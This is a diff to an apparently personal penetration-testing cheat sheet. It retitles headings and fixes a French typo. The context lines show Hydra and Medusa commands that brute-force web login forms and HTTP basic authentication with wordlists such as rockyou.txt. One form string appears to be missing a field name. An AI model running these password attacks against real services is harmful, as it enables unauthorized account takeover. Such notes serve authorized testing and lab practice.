@@ -1,6 +1,6 @@
 ## Hydra
 
-Login page attack
+Brute forcing login forms
 
 ```sh
 hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS^:F=Invalid" -f
@@ -10,7 +10,7 @@ hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS
 hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS^:S=logout.php" -f
 ```
 
-HTTP GET Attack
+Brute forcing basic HTTP auth
 
 ```sh
 hydra -I -l bob -P /opt/rockyou.txt "http-get://10.10.6.224/protected:A=BASIC"
@@ -22,7 +22,7 @@ medusa -h <IP> -u user -P wordlist.lst -M <module>
 ```
 
 HTTP htaccess Attack with medusa (Basic Authentication)
-Les pages avec les popus JS pour l'authentification qui utilise une protecter `.htaccess`
+Les pages avec les popus JS pour l'authentification qui utilise une protection `.htaccess`
 
 ```sh
 
